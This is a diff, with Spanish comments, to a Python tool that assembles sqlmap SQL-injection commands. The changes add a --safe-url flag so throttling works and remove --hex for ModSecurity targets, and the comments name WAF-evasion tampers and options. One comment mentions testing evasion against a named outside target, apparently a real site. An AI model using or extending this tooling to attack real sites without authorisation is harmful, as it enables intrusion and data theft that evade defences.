@@ -4,9 +4,9 @@ Construye el comando sqlmap completo basándose en todos
 los resultados del reconocimiento e inteligencia.
 """
 
-import os
 import shlex
 from typing import Optional
+from urllib.parse import urlparse
 from inyector.utils.logger import get_logger
 
 logger = get_logger(__name__)
@@ -33,7 +33,6 @@ class CommandBuilder:
         cookie = scan_config.get("cookie")
         headers = scan_config.get("headers", [])
         waf = scan_config.get("waf", {}).get("waf", "none")
-        orm = scan_config.get("orm", {}).get("orm", "none")
         timing = scan_config.get("timing", {})
         tampers = scan_config.get("tampers", [])
         technique = scan_config.get("technique")
@@ -84,7 +83,17 @@ class CommandBuilder:
             parts.append(f"--timeout={timeout}")
             parts.append(f"--retries={retries}")
             if safe_freq > 0:
+                # sqlmap ignora --safe-freq sin --safe-url (no hay a
+                # qué URL "descansar" entre ráfagas de payloads) -- bug
+                # real encontrado validando evasión contra UAEH: la
+                # pausa periódica nunca se activaba porque faltaba
+                # este flag, aunque se detectara WAF y se calculara
+                # safe_freq > 0. Usamos la raíz del dominio como
+                # request "inocente" entre tandas de ataque.
+                parsed = urlparse(url)
+                safe_url = f"{parsed.scheme}://{parsed.netloc}/"
                 parts.append(f"--safe-freq={safe_freq}")
+                parts.append(f"--safe-url={shlex.quote(safe_url)}")
 
         # 8. User-Agent realista
         parts.append("--random-agent")
@@ -112,10 +121,16 @@ class CommandBuilder:
             parts.append(f"--proxy={shlex.quote(proxy)}")
 
         # 15. Flags de evasión adicionales según WAF
+        # 'modsecurity' -> --hex quedó descartado: sqlmap rechaza esa
+        # combinación ("switch '--no-cast' is incompatible with switch
+        # '--hex'") porque --no-cast se agrega siempre arriba -- bug
+        # real que hacía fallar sqlmap instantáneamente (exit code 1,
+        # 0s) en cualquier scan contra un target modsecurity, sin
+        # mandar una sola request. Los tampers ya seleccionados para
+        # modsecurity (apostrophemask, base64encode,
+        # charunicodeencode...) cubren la evasión sin necesitar --hex.
         if waf == "cloudflare":
             parts.append("--hpp")
-        elif waf == "modsecurity":
-            parts.append("--hex")
 
         # 16. Si ORM detectado con raw queries
         orm_data = scan_config.get("orm", {})
